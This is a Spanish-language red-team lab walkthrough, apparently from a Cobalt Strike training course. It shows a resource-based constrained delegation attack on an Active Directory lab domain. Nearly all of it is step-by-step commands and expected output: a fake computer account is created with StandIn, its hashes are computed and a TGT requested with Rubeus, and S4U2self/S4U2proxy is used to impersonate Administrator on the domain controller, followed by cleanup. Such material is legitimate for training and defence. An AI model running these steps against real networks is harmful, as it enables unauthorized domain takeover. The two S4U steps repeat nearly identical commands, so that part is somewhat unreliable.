# Crear objeto de equipo y continuar el ataque

> Si no tienes acceso como administrador local a un equipo, puedes crear tu propio objeto de equipo.  
> De manera predeterminada, incluso los usuarios de dominio pueden unir hasta 10 equipos al dominio, controlado por el atributo `ms-DS-MachineAccountQuota` del objeto de dominio.

### Comprobar el atributo `ms-DS-MachineAccountQuota`:

```powershell
beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
```

**Salida esperada:**

```plaintext
ms-ds-machineaccountquota
-------------------------
                       10
```

---

## Crear un nuevo objeto de equipo

**StandIn** es un toolkit post-explotación creado por Ruben Boonen que permite crear un equipo con una contraseña aleatoria.

### Comando para crear el objeto:

```powershell
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
```

**Salida esperada:**

```yaml
[?] Using DC    : dc-2.dev.cyberbotic.io
    |_ Domain   : dev.cyberbotic.io
    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
    |_ Password : oIrpupAtF1YCXaw

[+] Machine account added to AD..
```

---

## Calcular los hashes para el objeto de equipo

> Usa **Rubeus** para calcular los hashes asociados con el nuevo equipo. Estos hashes se usarán posteriormente para generar tickets.

### Comando:

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
```

**Salida esperada:**

```plaintext
[*] Action: Calculate Password Hash(es)

[*] Input password             : oIrpupAtF1YCXaw
[*] Input username             : EvilComputer$
[*] Input domain               : dev.cyberbotic.io
[*] Salt                       : DEV.CYBERBOTIC.IOhostevilcomputer.dev.cyberbotic.io
[*]       rc4_hmac             : 73D0774058830F841C9205C857C9EE62
[*]       aes128_cts_hmac_sha1 : FB9A1AB8567D4EF4CEA6186A115D091A
[*]       aes256_cts_hmac_sha1 : 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
[*]       des_cbc_md5          : 49B5514F1F45700D
```

---

## Solicitar un TGT para el objeto de equipo falso

> Una vez calculado el hash AES, se puede usar para solicitar un **TGT (Ticket Granting Ticket)**.

### Comando:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
```

**Salida esperada:**

```yaml
[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\EvilComputer$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF8j[...]MuaW8=

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  EvilComputer$
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/13/2022 2:31:34 PM
  EndTime                  :  9/14/2022 12:31:34 AM
  RenewTill                :  9/20/2022 2:31:34 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  /s6yAyTa1670VNAT9yYBGya/mqOU/YJSLu0XuD2ReBE=
  ASREP (key)              :  7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
```

---

## Realizar la Suplantación S4U (Service for User)

### Paso 1: Usar el TGT para obtener un TGS con S4U2self

Utilizamos el comando `s4u` de **Rubeus** para generar un ticket de servicio (TGS) para el equipo falso.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIF8j[...]MuaW8= /nowrap
```

**Salida esperada:**

```plaintext
[*] Building S4U2self request for: 'EvilComputer$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'EvilComputer$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi): doIGcD[...]MuaW8=
```

---

### Paso 2: Usar el TGS para obtener acceso a recursos con S4U2proxy

Con el TGS generado, podemos realizar la solicitud S4U2proxy para acceder a los recursos objetivo como el usuario suplantado.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIGcD[...]MuaW8= /nowrap
```

**Salida esperada:**

```plaintext
[*] Impersonating user 'Administrator' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io': doIFdD[...]Jw2m8=
```

---

## Limpieza

### Paso 1: Eliminar el objeto del equipo falso

```powershell
beacon> powershell Remove-ADComputer -Identity "EvilComputer" -Confirm:$false
```

### Paso 2: Restaurar configuraciones en el equipo de destino

Por ejemplo, limpiar el atributo modificado `msDS-AllowedToActOnBehalfOfOtherIdentity`:

```powershell
beacon> powershell Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```
